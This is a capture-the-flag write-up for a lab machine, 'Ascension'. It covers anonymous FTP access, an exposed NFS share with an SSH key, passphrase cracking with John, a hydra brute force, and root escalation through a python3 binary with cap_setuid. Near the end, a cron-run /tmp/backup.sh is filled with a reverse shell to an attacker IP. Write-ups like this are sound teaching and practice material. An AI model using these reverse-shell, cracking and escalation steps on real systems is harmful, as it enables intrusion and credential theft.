---

Name: Ascension
Difficulty: Easy
URL: https://www.hacksmarter.org/events/7f9dc321-77ce-49b8-8acc-5c224ef25d8d/take/ascension-easy
Description: There are 6 flags on the machine (you can see the location of each by clicking the 'hint' button to make it less of a rabbit chase). There are also multiple ways to solve the machine... so if you solve it in one way, you can go back and see if you can find the 2nd way.

---

```bash
Open 10.1.122.75:21
Open 10.1.122.75:22
Open 10.1.122.75:80
Open 10.1.122.75:111
Open 10.1.122.75:2049
Open 10.1.122.75:39865
Open 10.1.122.75:54461
Open 10.1.122.75:55687
```


# FTP allows anonymous login
```bash
ftp 10.1.122.75
Connected to 10.1.122.75 (10.1.122.75).
220 (vsFTPd 3.0.5)
Name (10.1.122.75:theo): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
227 Entering Passive Mode (10,1,122,75,86,224).
150 Here comes the directory listing.
-rw-r--r--    1 0        0             202 Sep 21  2025 pwlist.txt
226 Directory send OK.
ftp> get pwlist.txt
local: pwlist.txt remote: pwlist.txt
227 Entering Passive Mode (10,1,122,75,108,156).
150 Opening BINARY mode data connection for pwlist.txt (202 bytes).
226 Transfer complete.
202 bytes received in 0.00142 secs (142.25 Kbytes/sec)
ftp>
```

We obtain pwlist.txt, a list of passwords


# Exploring RPC
```bash

111/tcp   open  rpcbind syn-ack 2-4 (RPC #100000)
| rpcinfo:
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100005  1,2,3      39865/tcp   mountd
|   100005  1,2,3      40261/udp   mountd
|   100005  1,2,3      43532/udp6  mountd
|   100005  1,2,3      48561/tcp6  mountd
|   100021  1,3,4      33261/tcp   nlockmgr
|   100021  1,3,4      39622/udp   nlockmgr
|   100021  1,3,4      45629/tcp6  nlockmgr
|   100021  1,3,4      50125/udp6  nlockmgr
|   100024  1          38371/udp   status
|   100024  1          38643/tcp6  status
|   100024  1          46231/udp6  status
|   100024  1          54461/tcp   status
|   100227  3           2049/tcp   nfs_acl
|_  100227  3           2049/tcp6  nfs_acl
2049/tcp  open  nfs_acl syn-ack 3 (RPC #100227)
39865/tcp open  mountd  syn-ack 1-3 (RPC #100005)
54461/tcp open  status  syn-ack 1 (RPC #100024)
55687/tcp open  mountd  syn-ack 1-3 (RPC #100005)
```

```bash
showmount -e 10.1.122.75
Export list for 10.1.122.75:
/srv/nfs/user1 *
```

We mount the exported NFS share:
```bash
sudo mkdir /tmp/nfs
sudo mount -t nfs 10.1.122.75:/srv/nfs/user1 /tmp/nfs
```

Inside we find some SSH keys
```bash
ls -l
.rw-r--r--. 1001 1001 2.6 KB Sun Sep 21 20:31:43 2025 󰷖 id_rsa
.rw-r--r--. 1001 1001 574 B  Sun Sep 21 20:31:45 2025 󰌆 id_rsa.pub
```

Reading the public key we find that the username is user1
```bash
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDM+ew08ndVI6aGrld5PZLbgK3Z+5nOl0UQthrmm1q/HHdv9C7MyqYYMcqxWpe1+IOmWYVOU45I9CJ58l71QP5dZ2QqQqZ64ueqChRST0w5QbYDiRaYCt1bjMClyZ2psf506Mujt1f1cDHS60ZPd/0/t1tqX+9TDWQC99xGaGsakOOil05ZhKAv8J37paItRR0ne7cSjG2+Qe8MOJSSnHGmIe5GnQ1PXpqiLPcD8Jm4t4IVCqCXF1Naz/nT94ZjTyywDuZovbVto9bxQYzrhygjqdiVaYhxbfVH61W+B3g+cRkjuahpPrH5yU7XXO9ikHRgQ76Oz5k0t9hv63wYZgUQxWtK7eh0GlkBm7gCDfw4eEvPFsWkWCbl/tWIfdmmUGKCsU13Zb1dEJUQLW49A8DcuD6dx7w4pwsn+1Tq0oVVMpBqR4kdf3LGr0lhlgB+5lJ9jtcFKAsbeNoqFGhDqBomN3/ReKjjixts6deTRconUSXBb4Ua7xC8PXtzSzTuXjk= user1@ip-10-1-25-146
```

We now know the account is `user1`. However, attempting to authenticate with the private key prompts us for a passphrase:
```bash
ssh -i id_rsa user1@10.1.122.75
The authenticity of host '10.1.122.75 (10.1.122.75)' can't be established.
ED25519 key fingerprint is SHA256:tV2Vsb0kQfumi5vsaGt7JIkuTcX0359OB3otJBlUmwk.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.1.122.75' (ED25519) to the list of known hosts.
Enter passphrase for key 'id_rsa':
```

This is where the wordlist comes in use, instead of manually trying each password we wiill use john

First, convert the key into a format that John the Ripper understands:
```bash
ssh2john id_rsa > id_rsa.hash
```

Then crack the passphrase using the password list:
```bash
john --wordlist=pwlist.txt id_rsa.hash
```

For some reason it didn't work, so I tried again with rockyou.txt
```bash
$ john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash
ssh-opencl: Cipher value of 6 is not yet supported with OpenCL
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [MD5/bcrypt-pbkdf/[3]DES/AES 32/64])
Cost 1 (KDF/cipher [0:MD5/AES 1:MD5/[3]DES 2:bcrypt-pbkdf/AES]) is 2 for all loaded hashes
Cost 2 (iteration count) is 24 for all loaded hashes
Will run 32 OpenMP threads
Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
sammie1          (/tmp/nfs/id_rsa)
1g 0:00:00:26 DONE (2026-08-06 17:18) 0.03815g/s 205.1p/s 205.1c/s 205.1C/s VANESSA..ghetto1
Use the "--show" option to display all of the cracked passwords reliably
Session completed


```
With it we manage to login via SSH
```bash
$ ssh -i id_rsa user1@10.1.122.75
sammie1
```


# First flag
```bash
$ find / -name "*flag*" 2> /dev/null
```
We find it in 
```bash
/opt/user1/flag1
```

# Fourth flag?
While trying to become user2 I have found the credentials for the wp-database and inside the flags table the fourth flag. Also we get the password for user3

```bash

user1@ip-10-1-122-75:/var/www/html$ mysql -u wpuser -p
Enter password:
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 9
Server version: 8.0.43-0ubuntu0.24.04.2 (Ubuntu)

Copyright (c) 2000, 2025, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> SHOW DATABASES;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| performance_schema |
| wordpress          |
+--------------------+
3 rows in set (0.00 sec)

mysql> USE wordpress;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> SHOW TABLES;
+---------------------+
| Tables_in_wordpress |
+---------------------+
| flags               |
| users               |
+---------------------+
2 rows in set (0.00 sec)

mysql> SELECT * from flags;
+----+------------------------------------------+
| id | flag                                     |
+----+------------------------------------------+
|  1 | REDACTED                                 |
+----+------------------------------------------+
1 row in set (0.00 sec)

mysql> SELECT * from users;
+----+----------+---------------+
| id | username | password      |
+----+----------+---------------+
|  1 | user3    | user3password |
+----+----------+---------------+
1 row in set (0.01 sec)
```

```bash
su user3
user3password
```

Since we are user3 now we can read the fifth flag
```bash
user3@ip-10-1-122-75:~$ cat /opt/user3/flag5
```

It's interesting to have python3 in our home directory
```bash
user3@ip-10-1-122-75:~$ ls -l
total 7836
-rwxr-xr-x 1 user3 user3 8021824 Sep 21  2025 python3
```

If we look at its capabilities we see that it change set its uid
```bash
$ getcap ~/python3
/home/user3/python3 cap_setuid=ep

```

We can now become root and read flag6
```bash

user3@ip-10-1-122-75:~$ ./python3
Python 3.12.3 (main, Aug 14 2025, 17:47:21) [GCC 13.3.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> import os
>>> os.getuid(), os.geteuid()
(1003, 1003)
>>> os.setuid(0)
>>> os.system("/bin/bash")
root@ip-10-1-122-75:~# id
uid=0(root) gid=1003(user3) groups=1003(user3)
root@ip-10-1-122-75:~# cd /opt/
root@ip-10-1-122-75:/opt# cd root
root@ip-10-1-122-75:/opt/root# ls
flag6
```

We could cheat and read flag2 and flag3 as root, but let's try to read it the intended way

I've decided to use [pspy](https://github.com/DominicBreuker/pspy) to look for procsesses 
```bash
scp -i /tmp/nfs/id_rsa /tmp/pspy64 user1@10.1.122.75:/tmp/
```

Now we start listening
```bash
chmod +x pspy64
./pspy64
```

We find this running with UID 1002 (user2), inside /tmp there is no backup.sh script, but we can create one ourselves 
```bash
2026/08/06 15:00:01 CMD: UID=1002  PID=3803   | /bin/sh -c /tmp/backup.sh
```

We want to get a shell so the contents of backup.sh will be
```bash
#!/bin/bash
sh -i >& /dev/tcp/10.200.77.254/4444 0>&1
```

We start a listener and wait
```bash
nc -lvnp 4444
```

We are now user2 and can read /opt/user2/flag2
```bash
$ id
uid=1002(user2) gid=1002(user2) groups=1002(user2)
```

For the ftpuser we brute force his password with the pwlist we found earlier
```bash
$ hydra -l ftpuser -P pwlist.txt ftp://10.1.122.75 -t 4
hydra -l ftpuser -P pwlist.txt ftp://10.1.122.75 -t 4
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-08-06 18:08:57
[DATA] max 4 tasks per 1 server, overall 4 tasks, 21 login tries (l:1/p:21), ~6 tries per task
[DATA] attacking ftp://10.1.122.75:21/
[21][ftp] host: 10.1.122.75   login: ftpuser   password: secret
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-08-06 18:09:05
```

We can now change users and read flag3
```bash
su ftpuser
secret
```
